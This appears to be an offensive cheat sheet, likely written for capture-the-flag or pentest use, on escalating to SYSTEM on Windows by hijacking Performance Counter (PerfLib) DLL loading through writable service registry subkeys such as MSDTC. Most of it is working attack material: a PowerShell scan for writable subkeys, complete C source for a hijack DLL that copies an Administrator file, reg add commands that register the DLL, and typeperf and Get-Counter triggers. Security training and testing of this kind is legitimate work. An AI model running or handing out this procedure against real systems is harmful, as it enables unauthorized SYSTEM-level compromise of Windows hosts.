# Performance-Counter (PerfLib) DLL Hijack → SYSTEM

## When this applies

- Standard or domain-joined Windows host where a regular user has **write access** to a service's `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Performance` registry subkey.
- Goal: load an attacker-controlled DLL into a SYSTEM process via the Windows Performance Counters infrastructure (no service restart, no scheduled task, no admin needed for the trigger).

The classic target was `RpcEptMapper` (RpcEptMapper-Performance is missing on stock Windows, so a custom counter class can be registered). When that path is patched / no longer writable, **MSDTC** is the textbook fallback — its Performance subkey is often writable to `Authenticated Users` or `NETWORK SERVICE` AND it ships a registered counter class on Windows Server 2008/2012/2016.

## Identification

```cmd
:: Enumerate writable Performance subkeys
accesschk.exe -accepteula -kvuw "HKLM\SYSTEM\CurrentControlSet\Services" "Authenticated Users"
accesschk.exe -accepteula -kvuw "HKLM\SYSTEM\CurrentControlSet\Services" "<your-user>"

:: Quick PowerShell scan for write-able Performance subkeys
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
  $perf = "$($_.PSPath)\Performance"
  try { Set-ItemProperty -Path $perf -Name __probe -Value 1 -ErrorAction Stop;
        Remove-ItemProperty -Path $perf -Name __probe -ErrorAction SilentlyContinue;
        $_.PSChildName }
  catch {} } 2>$null
```

For each writable hit, check whether a counter class is **already registered**:

```cmd
:: List registered counter classes (case-insensitive substring match)
typeperf -q | findstr /i "<svc>"
:: Or via PowerShell
Get-Counter -ListSet * | Where-Object { $_.CounterSetName -like "*<svc>*" }
```

| Service | Writable subkey common? | Counter class pre-registered? | Trigger |
|---|---|---|---|
| RpcEptMapper | yes (legacy boxes) | NO — must self-register | typeperf "\RpcEptMapper(*)\\*" |
| MSDTC | yes (2008/2012/2016) | YES — "Distributed Transaction Coordinator" | Get-Counter '\Distributed Transaction Coordinator\Active Transactions' |
| NetMan | sometimes | YES (Network) | dependent counter |
| Spooler | rare | YES | dependent counter |

When MSDTC is writable and `RpcEptMapper-Performance` cannot be self-registered (Win 2008 R2 / Server-Core variants), MSDTC is the textbook fallback because its counter class already exists — no class-registration call needed.

## Build the hijack DLL

```c
// perfmon_dll.c — compile with mingw on attacker host:
//   x86_64-w64-mingw32-gcc -shared -o perfmon.dll perfmon_dll.c -static -static-libgcc
#include <windows.h>
#include <stdio.h>

void payload(void) {
  CopyFileA("C:\\Users\\Administrator\\Desktop\\root.txt",
            "C:\\Users\\Public\\Documents\\r.txt", FALSE);
  // OR: spawn cmd as SYSTEM, write a .bat to Public, drop a service binary, etc.
}

// PerfLib expects three exported functions; PowerShell loads the DLL and
// CALLS OpenPerformanceData first.
__declspec(dllexport) DWORD WINAPI OpenPerformanceData(LPWSTR ctx)   { payload(); return 0; }
__declspec(dllexport) DWORD WINAPI CollectPerformanceData(LPWSTR vn,
       LPVOID *d, LPDWORD bs, LPDWORD nc) { return 0; }
__declspec(dllexport) DWORD WINAPI ClosePerformanceData(void)        { return 0; }

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) { return TRUE; }
```

```cmd
:: Drop perfmon.dll on the target (any path the user can write — C:\Users\<u>\AppData\Local\Temp\)
:: Then point the writable Performance subkey at it:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC\Performance" /v Library      /t REG_SZ /d "C:\Users\<u>\AppData\Local\Temp\perfmon.dll" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC\Performance" /v Open         /t REG_SZ /d "OpenPerformanceData" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC\Performance" /v Collect      /t REG_SZ /d "CollectPerformanceData" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC\Performance" /v Close        /t REG_SZ /d "ClosePerformanceData" /f
```

## Trigger as SYSTEM

The PerfLib provider is loaded by `winmgmt` (LocalSystem) when a WMI/Performance query is issued. From the low-priv user:

```powershell
# Kicks winmgmt → PerfLib → load our DLL with SYSTEM privileges.
Get-Counter '\Distributed Transaction Coordinator\Active Transactions' -ErrorAction SilentlyContinue
```

Equivalent triggers:

```cmd
typeperf "\Distributed Transaction Coordinator\Active Transactions" -sc 1
wmic /namespace:\\root\cimv2 path Win32_PerfRawData_<class>_<inst> get Name
```

The DLL runs in `wmiprvse.exe` (LocalSystem) on most builds; on Server-Core it loads inside `WmiPrvSE.exe` regardless. Verify with Sysmon/log path or by writing the SYSTEM token's `whoami` output to a file.

## Verifying success

- `C:\Users\Public\Documents\r.txt` exists and contains the captured file's contents.
- Sysmon EID 7 (Image Loaded) shows our DLL inside `wmiprvse.exe` with NT AUTHORITY\SYSTEM.

## Common pitfalls

- The DLL **must** export the three `OpenPerformanceData`/`CollectPerformanceData`/`ClosePerformanceData` symbols — missing any one of them silently aborts the load.
- Using a class that has no registered counter set (RpcEptMapper on stock Windows) requires registering one first via `lodctr /R:perf.ini` — fall back to MSDTC if write access to the .ini directory is missing.
- `wmiprvse.exe` caches loaded DLLs; if you re-build, change the path or `Library` value and re-trigger.
- The trigger queries any counter under the existing class — pick one that exists (`typeperf -qx '<class>'` enumerates instances).

## Tools

- mingw-w64 (`x86_64-w64-mingw32-gcc`) for the cross-compile
- AccessChk (Sysinternals) for writable-subkey discovery
- `typeperf` / `Get-Counter` for counter-class enumeration
- Sysmon (defender-side) — EID 7 catches PerfLib loads
